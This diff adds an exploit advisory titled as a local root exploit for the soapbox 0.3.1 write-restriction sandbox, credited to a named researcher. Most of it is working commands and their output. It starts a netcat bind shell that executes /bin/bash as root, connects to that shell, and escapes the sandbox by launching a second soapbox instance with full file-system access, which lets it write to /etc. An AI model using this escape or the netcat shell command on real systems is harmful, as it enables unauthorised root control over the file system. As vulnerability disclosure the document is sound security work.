@@ -1,0 +1,52 @@
+-----------------------------------
+soapbox 0.3.1 <= Local Root Exploit
+-----------------------------------
+
+Vendor URI: http://dag.wieers.com/home-made/soapbox/
+
+Credit: Jean Pascal Pereira <pereira@secbiz.de>
+
+Description:
+
+"Soapbox allows to restrict processes to write only to those places you want. Read-access however is still based on file-permissions. By preloading the Soapbox library, you can run programs as root and monitor which writes/changes are made, without them really happening. (Typically 'make install') 
+
+Beware this can be used for security-purposes, but it can deliberately be circumvented. Soapbox only impacts dynamically linked programs that properly use glibc functions. I'm currently looking into a safer implementation using ptrace. 
+
+Soapbox also triggered some bugs in applications that trusted system calls too much. So you can use soapbox to test your programs for these kinds of mistakes too."
+
+------------------------------------------------------------------------------------------
+
+
+First of all, we have to run soapbox on our target system.
+I'm going to create a new netcat process spawned in a restricted directory (/etc/opt/sbx). 
+
+------------------------------------------------------------------------------------------
+root@havoc:/etc/opt/sbx# soapbox -l log -p /etc/opt/sbx /bin/nc -l -v -p 4545 -e /bin/bash
+------------------------------------------------------------------------------------------
+
+After establishing a connection to our target system, we get a sandboxed root shell.
+Let's try to write data to a protected location.
+
+------------------------------------------------------------------------------------------
+$ nc 23.5.0.0 4545
+echo boom > /etc/abc
+bash: line 1: 1: Bad file descriptor
+------------------------------------------------------------------------------------------
+
+As we can see, soapbox restricts write access to this path.
+But what happens if we start another soapbox instance with full file-system access?
+
+------------------------------------------------------------------------------------------
+$ nc 23.5.0.0 4545
+soapbox -l log -p / /bin/bash # running another instance of soapbox that provides full file system access
+echo boom > /etc/abc
+cat /etc/abc
+boom # BOOM!
+------------------------------------------------------------------------------------------
+
+BOOM. Now we're able to start an unrestricted root shell and gain control over the file system.
+
+(This is still a local exploit because we were only able to exploit that issue remotely by using netcat).
+
+
+/* http://0xffe4.org */
